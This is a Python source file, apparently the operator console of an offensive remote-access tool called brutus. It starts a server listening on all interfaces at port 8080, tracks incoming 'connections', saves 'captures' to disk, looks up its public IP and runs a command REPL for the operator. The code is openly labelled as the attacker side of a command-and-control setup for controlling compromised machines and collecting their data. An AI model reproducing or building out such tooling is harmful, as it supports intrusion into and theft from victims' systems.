"""Attacker entry point — asyncio server + interactive REPL."""

import asyncio
import json
import pathlib
import threading

import requests

from brutus.attacker.service.locator_service import locator
from brutus.attacker.terminal.command.command import dispatch as command_dispatch
from brutus.attacker.terminal.server.server import Server
from brutus.attacker.terminal.terminal import Terminal
from brutus.attacker.util import UNKNOWN_COMMAND_TEMPLATE, VERSION

HOST = "0.0.0.0"
PORT = 8080
SAVE_DIR = pathlib.Path.cwd() / "brutus_captures"


def _fetch_public_ip() -> str:
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=15)
        return json.loads(r.content.decode("utf-8")).get("ip", "")
    except Exception:
        print("Could not retrieve public IP.")
        return ""


def _run_server(loop: asyncio.AbstractEventLoop, server: Server) -> None:
    asyncio.set_event_loop(loop)
    loop.run_until_complete(server.serve())


def main() -> None:
    SAVE_DIR.mkdir(parents=True, exist_ok=True)

    window = Terminal()
    connections: dict = {}

    ip = _fetch_public_ip()

    context = {
        "connections": connections,
        "ip": ip,
        "locator": locator,
        "version": VERSION,
    }

    # Show header
    command_dispatch("clear", window, context)

    # Start asyncio server in a background thread with its own event loop
    loop = asyncio.new_event_loop()
    context["loop"] = loop
    server = Server(HOST, PORT, window, connections, SAVE_DIR)
    server_thread = threading.Thread(target=_run_server, args=(loop, server), daemon=True)
    server_thread.start()
    print(f"Server listening on {HOST}:{PORT}")

    try:
        while True:
            try:
                command = input("> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("")
                break

            if not command:
                continue

            context.update({"connections": connections, "ip": ip})
            handled = command_dispatch(command, window, context)
            if not handled:
                window.Output.addItem(UNKNOWN_COMMAND_TEMPLATE.format(command=command))
    finally:
        print("Shutting down.")
        loop.call_soon_threadsafe(loop.stop)
        for conn in list(connections.values()):
            try:
                conn.writer.close()
            except Exception:
                pass
